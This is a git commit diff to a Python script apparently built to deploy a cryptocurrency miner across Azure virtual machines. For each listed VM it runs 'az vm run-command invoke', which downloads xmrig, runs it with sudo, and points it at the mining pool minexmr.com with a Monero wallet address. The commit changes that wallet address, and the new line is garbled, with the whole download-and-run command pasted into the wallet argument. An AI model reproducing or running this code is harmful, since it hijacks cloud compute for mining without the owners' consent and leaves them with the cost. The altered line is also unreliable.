c8f26221bb81f082e49f25ffa8e2768c468c7331
Thuwarakan <mothuwarakan@gmail.com>
2022-07-29 12:55:55 +0530

    Update untitled.py

--- untitled.py
+++ untitled.py
@@ -34,7 +34,7 @@ response = az_cli('vm list')
 
 def deployer(x):
         
-            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
+            runC='az vm run-command invoke -g '+str(x)+' -n '+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 86fJGBD4vkAZZkNJWXUruCFKfgZ6zPS1fEjrAodvksccPjQvRzQG9hmP83HY7Vp5XfKYxAqdrZqBWUGD3UYKj8ccAr9ECMM.'+sn+'"'  
             
             
             print("      * Script Executing : "+runC)
